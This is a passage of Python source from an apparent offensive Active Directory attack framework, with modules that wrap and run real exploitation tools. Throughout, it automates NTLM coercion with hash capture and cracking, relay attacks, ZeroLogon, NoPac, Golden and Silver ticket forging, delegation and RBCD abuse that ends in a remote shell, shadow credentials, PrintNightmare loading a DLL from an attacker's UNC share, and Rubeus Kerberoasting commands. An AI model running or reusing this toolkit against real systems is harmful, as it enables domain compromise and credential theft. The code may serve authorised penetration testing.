                tool = check_tool(*names)
                if tool: run_cmd([tool]+extra, label=label)
                else:    log(f'{label} not found — skipping','warn')
            if method in ('petitpotam','all'):
                _try(['PetitPotam.py','petitpotam'],[listener,t_host]+ua,'PetitPotam')
            if method in ('coercer','all'):
                _try(['Coercer','coercer'],['coerce','-t',t_host,'-l',listener]+ua,'Coercer')
            if method in ('printerbug','all'):
                auth = f'{target.domain}/{target.user}:{target.password}' if target.user else 'guest:'
                _try(['printerbug.py','printerbug'],[f'{auth}@{t_host}',listener],'PrinterBug')
            if method in ('dfscoerce','all'):
                _try(['dfscoerce.py','DFSCoerce'],['-u',target.user or '','-p',target.password or '',
                      '-d',target.domain or '',listener,t_host],'DFSCoerce')

        if action == 'capture':
            resp = check_tool('responder','Responder.py')
            if not resp:
                log('Responder not found — install: sudo apt install responder','error')
                hr(); return

            iface    = self.ask('interface','tun0')
            hash_out = os.path.join(target.loot_dir, 'ntlmv2_hashes.txt')

            log(f'{GREEN}Starting Responder on {WHITE}{iface}{RESET}','info')
            resp_proc = subprocess.Popen(
                ['sudo', resp, '-I', iface, '-v', '--lm'],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, errors='replace')

            import time as _t_coerce, threading as _th_coerce
            captured = []
            stop_evt = _th_coerce.Event()

            def _watch_responder():
                for line in resp_proc.stdout:
                    l = line.rstrip()
                    if 'NTLMv' in l and '::' in l:
                        # looks like a hash line
                        hash_line = l.strip()
                        captured.append(hash_line)
                        log(f'{GREEN}CAPTURED: {WHITE}{hash_line[:80]}{RESET}','success')
                        with open(hash_out,'a') as f: f.write(hash_line+'\n')
                        _db_save_hash(os.path.basename(target.loot_dir),
                                      target.domain, hash_line.split('::')[0],
                                      'NTLMv2', hash_line)
                    if stop_evt.is_set(): break

            watcher = _th_coerce.Thread(target=_watch_responder, daemon=True)
            watcher.start()
            _t_coerce.sleep(2)  # give responder time to bind

            log(f'Responder running — triggering coercion...','info')
            _coerce_all()

            log(f'Waiting 10s for hashes...','info')
            _t_coerce.sleep(10)
            stop_evt.set()
            resp_proc.terminate()

            if captured:
                log(f'{GREEN}{len(captured)} hash(es) captured → {WHITE}{hash_out}{RESET}','success')
                add_result('coerce', f'{len(captured)} NTLMv2 hash(es) captured')
                crack = self.ask('crack now with hashcat?','y',['y','n'])
                if crack == 'y':
                    wl = self.ask('wordlist','/usr/share/wordlists/rockyou.txt')
                    run_cmd(['hashcat','-m','5600',hash_out,wl,'--force'],
                            label='hashcat NTLMv2')
            else:
                log('No hashes captured — try a different coercion method','warn')

        elif action == 'relay':
            relay = check_tool('impacket-ntlmrelayx','ntlmrelayx.py')
            if not relay:
                log('impacket-ntlmrelayx not found','error'); hr(); return
            relay_target = self.ask('relay target (e.g. http://target or smb://target)')
            iface        = self.ask('interface','tun0')
            log(f'{ORANGE}Make sure SMB signing is disabled on relay target{RESET}','warn')
            relay_proc = subprocess.Popen(
                ['sudo', relay, '-t', relay_target, '-smb2support'],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, errors='replace')

            import time as _t_relay; _t_relay.sleep(2)
            log('ntlmrelayx running — triggering coercion...','info')
            _coerce_all()
            log(f'{GREY}Check ntlmrelayx output above for relay success{RESET}','info')
            input('  Press Enter to stop relay...')
            relay_proc.terminate()

        elif action == 'check':
            log('Check which coercion methods work (no listener needed)','info')
            for method_name, names, extra in [
                ('PetitPotam', ['PetitPotam.py','petitpotam'], [listener, t_host]+ua),
                ('Coercer',    ['Coercer','coercer'],          ['coerce','-t',t_host,'-l',listener]+ua),
                ('PrinterBug', ['printerbug.py','printerbug'], []),
                ('DFSCoerce',  ['dfscoerce.py','DFSCoerce'],   []),
            ]:
                tool = check_tool(*names)
                mark = f'{GREEN}✓ found{RESET}' if tool else f'{RED}✗ missing{RESET}'
                print(f'  {mark}  {WHITE}{method_name}{RESET}  {GREY}{tool or ""}{RESET}')

        hr()
        log(f'Crack captured hashes: {WHITE}hashcat -m 5600 {os.path.join(target.loot_dir,"ntlmv2_hashes.txt")} rockyou.txt{RESET}','info')
        hr()



class ZeroLogon(Module):
    name='zerologon'; description='CVE-2020-1472 -- ZeroLogon DC machine account password reset'; category='exploitation'
    def run(self, target):
        if not target.dc: log('Set DC first','error'); return
        hr()
        dc_name = self.ask('DC hostname (not IP, e.g. DC01)')
        if not dc_name: log('DC hostname required','error'); return
        action = self.ask('action','check',['check','exploit','restore'])
        tool = check_tool('cve-2020-1472-exploit.py','zerologon_tester.py','zerologon')
        if not tool:
            log('ZeroLogon tool not found','warn')
            log('git clone https://github.com/dirkjanm/CVE-2020-1472','info')
            print(f'  {WHITE}python3 cve-2020-1472-exploit.py {dc_name} {target.dc}{RESET}')
            return
        hr()
        if action == 'check':
            run_cmd([tool,dc_name,target.dc], label='zerologon check')
        elif action == 'exploit':
            log(f'{RED}WARNING -- resets DC machine account password!{RESET}','warn')
            if self.ask('type YES to confirm') == 'YES':
                run_cmd([tool,dc_name,target.dc], label='zerologon exploit')
                sd = check_tool('impacket-secretsdump','secretsdump.py')
                if sd: print(f'  {WHITE}{sd} {target.domain}/{dc_name}$@{target.dc} -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc{RESET}')
        elif action == 'restore':
            orig = self.ask('original machine NT hash')
            rt = check_tool('restorepassword.py')
            if rt: run_cmd([rt,f'{target.domain}/{dc_name}@{target.dc}','-target-ip',target.dc,'-hexpass',orig], label='zerologon restore')
        hr()

class NoPac(Module):
    name='nopac'; description='CVE-2021-42278/42287 -- NoPac sAMAccountName spoofing to Domain Admin'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        tool = check_tool('noPac','nopac.py','noPac.py')
        if not tool:
            log('noPac not found','warn')
            log('git clone https://github.com/Ridter/noPac','info')
            print(f'  {WHITE}python3 noPac.py {target.domain}/{target.user}:{target.password} -dc-ip {target.dc} --impersonate Administrator -shell{RESET}')
            return
        hr()
        action = self.ask('action','scan',['scan','shell','dump'])
        if target.password:
            cmd = [tool,f'{target.domain}/{target.user}:{target.password}','-dc-ip',target.dc]
        elif target.hash:
            cmd = [tool,f'{target.domain}/{target.user}','-hashes',f':{target.hash}','-dc-ip',target.dc]
        else: log('Need password or hash','error'); return
        if action == 'scan':    cmd += ['--scan']
        elif action == 'shell': cmd += ['--impersonate','Administrator','-shell']
        elif action == 'dump':  cmd += ['--impersonate','Administrator','-dump','-just-dc-user','Administrator']
        run_cmd(cmd, label=f'noPac {action}')
        hr()

class GoldenTicket(Module):
    name='golden'; description='forge Golden Ticket -- krbtgt hash + domain SID -> unlimited domain access'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        t = self.need('impacket-ticketer','ticketer.py')
        if not t: return
        hr()
        krbtgt = self.ask('krbtgt NT hash')
        sid    = self.ask('domain SID (S-1-5-21-...)')
        user   = self.ask('user to forge','Administrator')
        extra_sid = self.ask('extra SID for inter-forest trust (blank = none)','')
        if not krbtgt or not sid: log('krbtgt hash and domain SID required','error'); return
        out = os.path.join(target.loot_dir,f'golden_{user}.ccache')
        cmd = [t,'-nthash',krbtgt,'-domain-sid',sid,'-domain',target.domain,user]
        if extra_sid: cmd += ['-extra-sid',extra_sid]
        run_cmd(cmd, label='Golden Ticket')
        log(f'Export: {WHITE}export KRB5CCNAME={out}{RESET}','info')
        log(f'Use:    {WHITE}impacket-wmiexec -k -no-pass {user}@{target.dc}{RESET}','info')
        hr()

class SilverTicket(Module):
    name='silver'; description='forge Silver Ticket -- service account hash + SID + SPN -> service access'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        t = self.need('impacket-ticketer','ticketer.py')
        if not t: return
        hr()
        svc_hash = self.ask('service account NT hash')
        sid      = self.ask('domain SID (S-1-5-21-...)')
        user     = self.ask('user to forge','Administrator')
        spn      = self.ask('SPN (e.g. cifs/dc01.domain.local)')
        if not svc_hash or not sid or not spn: log('Hash, SID, and SPN required','error'); return
        run_cmd([t,'-nthash',svc_hash,'-domain-sid',sid,'-domain',target.domain,'-spn',spn,user], label='Silver Ticket')
        hr()


class Delegation(Module):
    name='delegation'; description='enumerate delegation types + abuse constrained delegation (KCD/S4U2Self)'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','enum',['enum','attack','s4u'])

        if action == 's4u':
            hr()
            log(f'{WHITE}S4U2Self + S4U2Proxy — impersonate any user via AllowedToAct/DelegatedAdmins{RESET}','info')
            getST = self.need('impacket-getST','getST.py')
            if not getST: return
            impersonate = self.ask('user to impersonate', 'Administrator')
            spn         = self.ask('target SPN', f'host/dc01.{target.domain}')
            ccache      = os.environ.get('KRB5CCNAME','')

            if target.hash:
                cmd = [getST,'-impersonate',impersonate,'-spn',spn,
                       '-hashes',f':{target.hash}',f'{target.domain}/{target.user}','-dc-ip',target.dc]
            elif target.password:
                cmd = [getST,'-impersonate',impersonate,'-spn',spn,
                       f'{target.domain}/{target.user}:{target.password}','-dc-ip',target.dc]
            elif ccache and os.path.exists(ccache):
                cmd = [getST,'-impersonate',impersonate,'-spn',spn,
                       '-k','-no-pass',f'{target.domain}/{target.user}','-dc-ip',target.dc]
            else:
                log('No credentials available','error'); hr(); return

            orig = os.getcwd(); os.chdir(target.loot_dir)
            subprocess.run(cmd)
            os.chdir(orig)

            import glob as _gl_s4u
            tickets = sorted(_gl_s4u.glob(os.path.join(target.loot_dir,f'*{impersonate}*.ccache')),
                             key=os.path.getmtime, reverse=True)
            if tickets:
                log(f'{GREEN}Ticket saved: {WHITE}{tickets[0]}{RESET}','success')
                log(f'Set: {WHITE}export KRB5CCNAME={tickets[0]}{RESET}','info')
                add_result('delegation', f'impersonate {impersonate}')
                log(f'Now run: {C0}dcsync{RESET} or {C0}exec{RESET}','info')
            hr(); return

        elif action == 'attack':
            hr()
            log(f'{WHITE}Constrained Delegation Attack (S4U2Self + S4U2Proxy){RESET}','info')
            log(f'{GREY}Requires: account with TrustedToAuthForDelegation + msDS-AllowedToDelegateTo set{RESET}','info')
            hr()
            deleg_acct  = self.ask('delegating account (e.g. FS01$)', target.user or '')
            deleg_pass  = self.ask('password', target.password or '')
            target_spn  = self.ask('target SPN', f'cifs/dc.{target.domain}')
            impersonate = self.ask('impersonate user (avoid Protected Users / NOT_DELEGATED accounts)', 'Ryan.Cooper')
            dc_host     = target.dc_fqdn or target.dc

            import subprocess as _sp_da, re as _re_da
            getST  = check_tool('impacket-getST','getST.py')
            getTGT = check_tool('impacket-getTGT','getTGT.py')
            wmiexec = check_tool('impacket-wmiexec','wmiexec.py')

            if not getST: log('impacket-getST not found','error'); hr(); return

            # step 0 — set delegation attributes via bloodyAD
            setup = self.ask('set TrustedForDelegation + msDS-AllowedToDelegateTo via bloodyAD first?','y',['y','n'])
            if setup == 'y':
                setup_user = self.ask('user with rights to set delegation (e.g. Helen.Frost)', '')
                setup_pass = self.ask('password', '')
                bloody = check_tool('bloodyad','bloodyAD')
                if bloody:
                    dc_h = target.dc_fqdn or target.dc
                    # get ccache for setup user
                    import glob as _gl_s
                    setup_cc = sorted(_gl_s.glob(os.path.join(target.loot_dir, f'*{setup_user.split(".")[0]}*.ccache')),
                                      key=os.path.getmtime, reverse=True)
                    if setup_cc:
                        base_s = [bloody,'--host',dc_h,'-d',target.domain,'-u',setup_user,'-k']
                        env_s  = {**os.environ,'KRB5CCNAME':setup_cc[0]}
                    else:
                        base_s = [bloody,'--host',dc_h,'-d',target.domain,'-u',setup_user,'-p',setup_pass]
                        env_s  = os.environ.copy()
                    # set TrustedToAuthForDelegation using bloodyAD setAttr
                    log(f'Setting TrustedToAuthForDelegation on {WHITE}{deleg_acct}{RESET}...','info')
                    r1 = subprocess.run(base_s+['add','uac',deleg_acct,'-f','TRUSTED_TO_AUTH_FOR_DELEGATION'],
                        text=True, capture_output=True, env=env_s)
                    if r1.returncode == 0:
                        log(f'{GREEN}TrustedToAuthForDelegation set{RESET}','success')
                    else:
                        log(f'{ORANGE}UAC set failed — trying alternative method{RESET}','warn')
                        print(r1.stdout); print(r1.stderr)
                    # set msDS-AllowedToDelegateTo
                    spns = [target_spn]
                    if ',' not in target_spn:
                        # add short form too
                        short = target_spn.split('/')[1].split('.')[0] if '/' in target_spn else ''
                        if short: spns.append(f'{target_spn.split("/")[0]}/{short}')
                    for spn in spns:
                        log(f'Adding delegate SPN: {WHITE}{spn}{RESET}','info')
                        r2 = subprocess.run(base_s+['set','object',deleg_acct,'msDS-AllowedToDelegateTo','-v',spn],
                            text=True, capture_output=True, env=env_s)
                        print(r2.stdout.strip()) if r2.stdout.strip() else None
            log(f'Step 1 — TGT for {WHITE}{deleg_acct}{RESET}','info')
            # small wait for DC to process delegation attribute changes
            import time as _time_da, glob as _gl_da
            _time_da.sleep(2)
            r_tgt = subprocess.run([getTGT, f'{target.domain}/{deleg_acct}:{deleg_pass}',
                '-dc-ip', target.dc], text=True, capture_output=True, cwd=target.loot_dir)
            print(r_tgt.stdout); print(r_tgt.stderr)
            acct_stem = deleg_acct.replace('$','_')
            ccaches = sorted(_gl_da.glob(os.path.join(target.loot_dir, f'*{acct_stem}*.ccache')), key=os.path.getmtime, reverse=True)
            if not ccaches:
                ccaches = sorted(_gl_da.glob(os.path.join(target.loot_dir,'*.ccache')), key=os.path.getmtime, reverse=True)
            if not ccaches: log('TGT ccache not found','error'); hr(); return
            if 'KDC_ERR' in r_tgt.stdout + r_tgt.stderr or 'SessionError' in r_tgt.stdout + r_tgt.stderr:
                log(f'{RED}TGT failed — check password for {deleg_acct}{RESET}','error')
                log(f'Try: {C0}bloody resetpwd {deleg_acct}{RESET}','info')
                hr(); return
            cc = ccaches[0]
            os.environ['KRB5CCNAME'] = cc
            log(f'{GREEN}TGT: {WHITE}{cc}{RESET}','success')

            # step 2 — getST
            log(f'Step 2 — S4U2Self+Proxy → impersonate {WHITE}{impersonate}{RESET}','info')
            cmd_st = [getST, '-spn', target_spn, '-impersonate', impersonate,
                      '-k', '-no-pass', f'{target.domain}/{deleg_acct}']
            r_st = subprocess.run(cmd_st, text=True, capture_output=True, cwd=target.loot_dir,
                              env={**os.environ, 'KRB5CCNAME': cc})
            print(r_st.stdout); print(r_st.stderr)
            if 'KDC_ERR_BADOPTION' in r_st.stderr + r_st.stdout:
                log(f'{ORANGE}KDC_ERR_BADOPTION — possible causes:{RESET}','warn')
                log(f'  1. Target user has {WHITE}NOT_DELEGATED{RESET} flag set (e.g. Administrator, Protected Users)','info')
                log(f'  2. TGT is not forwardable — get a fresh TGT after setting delegation','info')
                log(f'  Try impersonating a different user (e.g. {WHITE}Ryan.Cooper{RESET} or another DA)','info')

            # find the service ticket
            st_ccaches = sorted(_gl_da.glob(os.path.join(target.loot_dir,f'*{impersonate}*cifs*')),
                                key=os.path.getmtime, reverse=True)
            if not st_ccaches:
                st_ccaches = sorted(_gl_da.glob(os.path.join(target.loot_dir,f'*{impersonate}*')),
                                   key=os.path.getmtime, reverse=True)
            if not st_ccaches:
                st_ccaches = sorted(_gl_da.glob(os.path.join(target.loot_dir,'*.ccache')),
                                   key=os.path.getmtime, reverse=True)
            if st_ccaches:
                st_cc = st_ccaches[0]
                os.environ['KRB5CCNAME'] = st_cc
                log(f'{GREEN}Service ticket: {WHITE}{st_cc}{RESET}','success')
                log(f'Step 3 — shell as {WHITE}{impersonate}{RESET}','info')
                log(f'  {WHITE}export KRB5CCNAME={st_cc}{RESET}','info')
                log(f'  {WHITE}impacket-wmiexec -k -no-pass {impersonate}@{dc_host}{RESET}','info')
                go = self.ask('launch wmiexec now?','y',['y','n'])
                if go == 'y' and wmiexec:
                    pid = os.fork()
                    if pid == 0:
                        os.execvp(wmiexec, [wmiexec,'-k','-no-pass',f'{impersonate}@{dc_host}'])
                    else:
                        os.waitpid(pid, 0)
            else:
                log('Service ticket not found — check output above','error')
            hr(); return

        log(f'{C0}Delegation Enumeration{RESET}','info')
        hr()

        # ── bloodyad writable ─────────────────────────────────────────────
        bloody = check_tool('bloodyad','bloodyAD')

        # ── impacket findDelegation ───────────────────────────────────────
        fd = check_tool('impacket-findDelegation','findDelegation.py')

        if fd:
            log('impacket-findDelegation — full delegation report','info')
            auth_str, hashes = target.imp_str()
            cmd = [fd] + hashes + auth_str + ['-dc-ip',target.dc]
            ccache = os.environ.get('KRB5CCNAME','')
            if ccache and os.path.exists(ccache):
                cmd = [fd,f'{target.domain}/{target.user}','-k','-no-pass','-dc-ip',target.dc]
            rc, lines = run_cmd_capture(cmd, label='findDelegation')

            # parse and categorize
            unconstrained = []
            constrained   = []
            rbcd          = []
            protocol_trans = []

            for line in lines:
                if 'Unconstrained' in line:
                    unconstrained.append(line.strip())
                elif 'Constrained w/ Protocol Transition' in line or 'any' in line.lower():
                    protocol_trans.append(line.strip())
                elif 'Constrained' in line:
                    constrained.append(line.strip())
                elif 'Resource Based' in line or 'RBCD' in line:
                    rbcd.append(line.strip())

            if unconstrained:
                log(f'{RED}Unconstrained delegation ({len(unconstrained)} objects) — can steal any TGT','warn')
                for l in unconstrained: print(f'  {PINK}{l}{RESET}')
                hr()
                log(f'Attack: coerce DC to authenticate → capture TGT → DCSync','info')
                log(f'  → modules: {WHITE}coerce{RESET} + {WHITE}ptt{RESET} + {WHITE}dcsync{RESET}','info')

            if protocol_trans:
                log(f'{ORANGE}Constrained + Protocol Transition ({len(protocol_trans)} objects) — S4U2Self without creds','warn')
                for l in protocol_trans: print(f'  {PINK}{l}{RESET}')
                hr()
                log(f'Attack: getST -self -impersonate Administrator','info')

            if constrained:
                log(f'{ORANGE}Constrained delegation ({len(constrained)} objects) — can delegate to specific SPNs','warn')
                for l in constrained: print(f'  {PINK}{l}{RESET}')
                hr()
                log(f'Attack: getST -spn <target_spn> -impersonate Administrator','info')

            if rbcd:
                log(f'{ORANGE}RBCD ({len(rbcd)} objects) — resource-based constrained delegation','warn')
                for l in rbcd: print(f'  {PINK}{l}{RESET}')

            if not any([unconstrained, constrained, rbcd, protocol_trans]):
                log('No dangerous delegation found','success')

        elif bloody:
            # fallback: manual LDAP search via bloodyad
            log('findDelegation not found — using bloodyAD LDAP search','warn')
            base = [bloody]+target.bloodyad_args()

            log(f'{C0}Unconstrained delegation (TrustedForDelegation=True){RESET}','info')
            run_cmd(base+['get','search',
                '--filter','(userAccountControl:1.2.840.113556.1.4.803:=524288)',
                '--attr','sAMAccountName,userAccountControl,distinguishedName'],
                label='bloodyAD unconstrained')

            log(f'{C0}Constrained delegation (msDS-AllowedToDelegateTo set){RESET}','info')
            run_cmd(base+['get','search',
                '--filter','(msDS-AllowedToDelegateTo=*)',
                '--attr','sAMAccountName,msDS-AllowedToDelegateTo'],
                label='bloodyAD constrained')

            log(f'{C0}RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity set){RESET}','info')
            run_cmd(base+['get','search',
                '--filter','(msDS-AllowedToActOnBehalfOfOtherIdentity=*)',
                '--attr','sAMAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity'],
                label='bloodyAD RBCD')

        else:
            log('No tool found — install impacket or bloodyAD','error')
            hr(); return

        # ── save results ──────────────────────────────────────────────────
        out = os.path.join(target.loot_dir,'delegation.txt')
        log(f'{GREY}Tip: raw output in findDelegation output above — save manually if needed{RESET}','info')

        # ── quick reference ───────────────────────────────────────────────
        hr()
        print(f'  {C0}{BOLD}delegation attack quick reference{RESET}')
        print(f'  {GREY}unconstrained  {WHITE}coerce DC auth + ptt → dcsync{RESET}')
        print(f'  {GREY}constrained    {WHITE}getST -spn <SPN> -impersonate admin{RESET}')
        print(f'  {GREY}protoc. trans  {WHITE}getST -self -impersonate admin → getST -additional-ticket{RESET}')
        print(f'  {GREY}RBCD           {WHITE}rbcd module → getST -impersonate admin{RESET}')
        hr()

class RBCD(Module):
    name='rbcd'; description='RBCD -- resource-based constrained delegation via impacket + getST'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','write',['write','read','gst'])
        hr()

        ccache = os.environ.get('KRB5CCNAME','')
        use_krb = bool(ccache and os.path.exists(ccache))
        rbcd = check_tool('impacket-rbcd','rbcd.py')

        def _rbcd_auth():
            if target.hash:
                return ['-hashes',f':{target.hash}',f'{target.domain}/{target.user}','-dc-ip',target.dc]
            elif target.password:
                return [f'{target.domain}/{target.user}:{target.password}','-dc-ip',target.dc]
            elif use_krb:
                return ['-k','-no-pass',f'{target.domain}/{target.user}@{target.dc_fqdn or target.dc}','-dc-ip',target.dc]
            else:
                return [f'{target.domain}/{target.user}','-dc-ip',target.dc]

        if action == 'write':
            if not rbcd: log('impacket-rbcd not found','error'); hr(); return
            delegate_from = self.ask('account to grant delegation (e.g. FS01$)')
            delegate_to   = self.ask('target computer (e.g. DC01$)')
            cmd = [rbcd,'-action','write','-delegate-from',delegate_from,
                   '-delegate-to',delegate_to] + _rbcd_auth()
            run_cmd(cmd, label='impacket-rbcd write')
            log(f'Now run: {C0}rbcd → gst{RESET} as {WHITE}{delegate_from}{RESET} to impersonate DA','info')

        elif action == 'read':
            if not rbcd: log('impacket-rbcd not found','error'); hr(); return
            target_comp = self.ask('target computer (e.g. DC01$)')
            cmd = [rbcd,'-action','read','-delegate-to',target_comp] + _rbcd_auth()
            run_cmd(cmd, label='impacket-rbcd read')

        elif action == 'gst':
            getST = self.need('impacket-getST','getST.py')
            if not getST: return
            delegate_from = self.ask('delegating account (e.g. FS01$)')
            delegate_pass = self.ask('password', target.password or '')
            impersonate   = self.ask('user to impersonate', 'Administrator')
            spn           = self.ask('SPN', f'cifs/dc01.{target.domain}')
            altservice    = self.ask('altservice (e.g. HTTP/dc01.domain — blank to skip)', '')

            # get forwardable TGT via kinit
            log(f'Getting forwardable TGT via kinit -f for {WHITE}{delegate_from}{RESET}','info')
            kinit_cc = f'/tmp/krb5cc_rbcd_{os.getpid()}'
            env_k    = {**os.environ, 'KRB5CCNAME': kinit_cc}
            subprocess.run(['kinit','-f',f'{delegate_from}@{target.domain.upper()}'],
                          input=f'{delegate_pass}\n', text=True, env=env_k)

            orig = os.getcwd(); os.chdir(target.loot_dir)
            cmd = [getST,'-spn',spn,'-impersonate',impersonate,
                   '-dc-ip',target.dc,'-k','-no-pass',
                   f'{target.domain}/{delegate_from}']
            if altservice: cmd += ['-altservice',altservice]
            subprocess.run(cmd, env=env_k)
            os.chdir(orig)

            import glob as _gl_rbcd
            pattern = f'*{impersonate}*'
            tickets = sorted(_gl_rbcd.glob(os.path.join(target.loot_dir, pattern)),
                             key=os.path.getmtime, reverse=True)
            if tickets:
                log(f'{GREEN}Ticket: {WHITE}{tickets[0]}{RESET}','success')
                log(f'export KRB5CCNAME={tickets[0]}','info')
                svc = altservice.split('/')[0] if altservice else spn.split('/')[0]
                log(f'evil-winrm -i {target.dc_fqdn or target.dc} -r {target.domain.upper()}','info')
                add_result('delegation', f'impersonate {impersonate}')
        hr()

class ShadowCredentials(Module):
    name='shadowcred'; description='shadow credentials -- add KeyCredentialLink via certipy or pywhisker'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        t_user = self.ask('target user/computer')
        tool   = self.ask('tool','certipy',['certipy','pywhisker'])

        # resolve sAMAccountName with spaces via LDAP lookup
        def _resolve_sam(name, target):
            if ' ' not in name: return name
            bloody = check_tool('bloodyad','bloodyAD')
            if not bloody: return name
            import subprocess as _sp2, re as _re2
            base = [bloody,'--host',target.dc,'-d',target.domain,'-u',target.user]
            if target.password: base += ['-p',target.password]
            elif target.hash: base += ['-p',f':{target.hash}']
            try:
                out = subprocess.check_output(
                    base+['get','search','--filter',f'(cn={name})','--attr','sAMAccountName'],
                    stderr=subprocess.DEVNULL, text=True, timeout=10)
                m = re.search(r'sAMAccountName:[ \t]*(\S+)', out)
                if m:
                    sam = m.group(1)
                    log(f'Resolved sAMAccountName: {WHITE}{sam}{RESET}','info')
                    return sam
            except Exception: pass
            return name

        t_user_sam = _resolve_sam(t_user, target)

        if tool == 'certipy':
            t = self.need('certipy','certipy-ad')
            if not t: return
            dc_host = target.dc_fqdn or f'DC01.{target.domain}'
            log(f'Using DC host: {WHITE}{dc_host}{RESET}','info')

            # prefer Kerberos ccache — on NTLM-disabled domains password auth fails
            # fall back to password only if no ccache available
            ccache = os.environ.get('KRB5CCNAME','')
            loot_cc = os.path.join(target.loot_dir, f'{target.user}.ccache')
            if not ccache and os.path.exists(loot_cc):
                ccache = loot_cc; os.environ['KRB5CCNAME'] = ccache
            if ccache and os.path.exists(ccache):
                log(f'{GREEN}Using Kerberos ccache: {WHITE}{ccache}{RESET}','info')
                ba = ['-u',f'{target.user}@{target.domain}','-dc-ip',target.dc,
                      '-k','-no-pass','-target',dc_host,'-dc-host',dc_host]
            elif target.password:
                ba = ['-u',f'{target.user}@{target.domain}','-dc-ip',target.dc,
                      '-target',dc_host,'-dc-host',dc_host,'-p',target.password]
            elif target.hash:
                ba = ['-u',f'{target.user}@{target.domain}','-dc-ip',target.dc,
                      '-target',dc_host,'-dc-host',dc_host,'-hashes',f':{target.hash}']
            else:
                log('No credentials or ccache available','error'); hr(); return
            shadow_cmd = [t,'shadow','auto']+ba+['-account',t_user_sam]
            _, lines = run_cmd_capture(shadow_cmd, label='certipy shadow')
            # check if PKINIT failed — if so offer ldap-shell fallback
            pkinit_err = any('PADATA_TYPE_NOSUPP' in l or 'PKINIT' in l for l in lines)
            nt_hash = None
            for l in lines:
                m = re.search(r'NT hash for.*?: ([a-f0-9]{32})', l)
                if m: nt_hash = m.group(1)
            if nt_hash:
                log(f'{GREEN}NT hash: {WHITE}{nt_hash}{RESET}','success')
                os.makedirs(target.loot_dir, exist_ok=True)
                with open(os.path.join(target.loot_dir,'shadow_hashes.txt'),'a') as f:
                    f.write(f'{t_user_sam}:{nt_hash}\n')
            elif pkinit_err:
                log(f'{ORANGE}PKINIT not supported — DC lacks Smart Card Logon EKU{RESET}','warn')
                log(f'Fallback: use certipy ldap-shell to authenticate via Schannel','info')
                pfx_file = f'{t_user_sam}.pfx'
                if not os.path.exists(pfx_file):
                    pfx_file = os.path.join(target.loot_dir, f'{t_user_sam}.pfx')
                if os.path.exists(pfx_file):
                    log(f'{WHITE}certipy auth -pfx {pfx_file} -dc-ip {target.dc} -ldap-shell{RESET}','info')
                    do_shell = self.ask('open ldap-shell now?','y',['y','n'])
                    if do_shell == 'y':
                        subprocess.call([t,'auth','-pfx',pfx_file,'-dc-ip',target.dc,'-ldap-shell'])
        elif tool == 'pywhisker':
            t = self.need('pywhisker')
            if not t: return
            cmd = [t,'-d',target.domain,'-u',target.user,'--target',t_user_sam,'--action','add','-D',target.dc]
            if target.password: cmd += ['-p',target.password]
            elif target.hash:   cmd += ['-H',target.hash]
            run_cmd(cmd, label='pywhisker shadow')
        hr()

class PrintNightmare(Module):
    name='printnightmare'; description='CVE-2021-1675/34527 -- PrintNightmare RCE via Spooler service'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        tool = check_tool('CVE-2021-1675.py','printnightmare.py')
        if not tool:
            log('PrintNightmare tool not found','warn')
            log('git clone https://github.com/cube0x0/CVE-2021-1675','info')
            print(f'  {WHITE}python3 CVE-2021-1675.py {target.domain}/{target.user}:{target.password}@{target.dc} "\\\\ATTACKER\\share\\evil.dll"{RESET}')
            return
        local_ip = self.ask('your IP')
        dll_path = self.ask('DLL UNC path',f'\\\\{local_ip}\\share\\evil.dll')
        t_host   = self.ask('target',target.dc)
        auth     = f'{target.domain}/{target.user}:{target.password}' if target.password else f'{target.domain}/{target.user}'
        cmd = [tool,auth,t_host,dll_path]
        if target.hash: cmd += ['-hashes',f':{target.hash}']
        run_cmd(cmd, label='PrintNightmare')
        hr()

class Rubeus(Module):
    name='rubeus'; description='Rubeus wrapper -- Kerberoast, ASREPRoast, forge tickets, PTT, dump, harvest (via exec)'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{GREY}Rubeus must be on a Windows host. This generates the command to run via exec/shell.{RESET}','warn')
        action = self.ask('action','kerberoast',
            ['kerberoast','asreproast','dump','tgtdeleg','harvest','s4u','ptt','createnetonly',
             'describe','klist','purge','brute','monitor','currentluid'])
        hr()
        rubeus = 'Rubeus.exe'
        if action == 'kerberoast':
            fmt = self.ask('hash format','hashcat',['hashcat','john'])
            user = self.ask('target user (blank = all)','')
            cmd = f'{rubeus} kerberoast /format:{fmt} /nowrap'
            if user: cmd += f' /user:{user}'
        elif action == 'asreproast':
            fmt = self.ask('hash format','hashcat',['hashcat','john'])
            user = self.ask('target user (blank = all)','')
            cmd = f'{rubeus} asreproast /format:{fmt} /nowrap'
            if user: cmd += f' /user:{user}'
        elif action == 'dump':
            svc = self.ask('service filter (blank = all)','')
            cmd = f'{rubeus} dump /nowrap'
            if svc: cmd += f' /service:{svc}'
        elif action == 'tgtdeleg':
            spn = self.ask('SPN','ldap/dc01.domain.local')
            cmd = f'{rubeus} tgtdeleg /spn:{spn} /nowrap'
        elif action == 'harvest':
            interval = self.ask('monitor interval seconds','30')
            cmd = f'{rubeus} harvest /interval:{interval}'
        elif action == 's4u':
            user = self.ask('impersonate user','Administrator')
            spn  = self.ask('SPN','cifs/dc01.domain.local')
            tix  = self.ask('TGT file or /ticket:base64','')
            cmd  = f'{rubeus} s4u /impersonateuser:{user} /msdsspn:{spn} /nowrap'
            if tix: cmd += f' /ticket:{tix}'
        elif action == 'ptt':
            tix = self.ask('ticket (file or base64)')
            cmd = f'{rubeus} ptt /ticket:{tix}'
        elif action == 'createnetonly':
            prog = self.ask('program','cmd.exe')
            cmd  = f'{rubeus} createnetonly /program:{prog} /show'
        elif action == 'monitor':
            interval = self.ask('interval seconds','10')
            cmd = f'{rubeus} monitor /interval:{interval} /nowrap'
        elif action == 'brute':
            users = self.ask('user or userlist')
            pw    = self.ask('password')
            cmd   = f'{rubeus} brute /password:{pw}'
